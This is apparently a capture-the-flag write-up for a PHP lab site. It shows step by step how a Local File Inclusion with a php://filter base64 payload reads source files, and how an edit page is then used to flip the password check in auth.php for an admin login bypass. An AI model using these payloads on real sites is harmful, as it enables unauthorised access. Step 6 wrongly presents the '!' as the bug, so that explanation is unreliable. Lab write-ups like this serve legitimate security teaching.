🧩 Full Solution (Writeup)
🔍 Step 1: Explore the website

We start by visiting the main page:

http://<IP>:8080

We see a simple admin login form.

Trying random credentials → ❌ Invalid credentials

🔎 Step 2: Look for vulnerabilities

Try common parameters like:

http://<IP>:8080/?page=login.php

👉 The page loads → interesting 👀
This suggests a Local File Inclusion (LFI) vulnerability.

⚠️ Step 3: Read source code (important)

Direct inclusion executes PHP, so we use a trick:

http://<IP>:8080/?page=php://filter/convert.base64-encode/resource=login.php

This returns base64.

🧪 Step 4: Decode it
echo "BASE64_HERE" | base64 -d

Now we see:

require_once "auth.php";

👉 There is another file: auth.php

🔁 Step 5: Read auth.php
http://<IP>:8080/?page=php://filter/convert.base64-encode/resource=auth.php

Decode it → we get:

if (!check_password($password, $stored_hash)) {
    return false;
}
💡 Step 6: Understand the bug

This line means:

If password is incorrect → return false
BUT the ! (NOT) can be abused

👉 If we remove !, the logic flips

🔓 Step 7: Modify the file

Go to:

http://<IP>:8080/edit.php

Set:

file: /var/www/html/auth.php

Change:

if (!check_password($password, $stored_hash)) {

👉 into:

if (check_password($password, $stored_hash)) {

Save.

🚪 Step 8: Login

Now use:

username: admin
password: anything

👉 Login succeeds ✅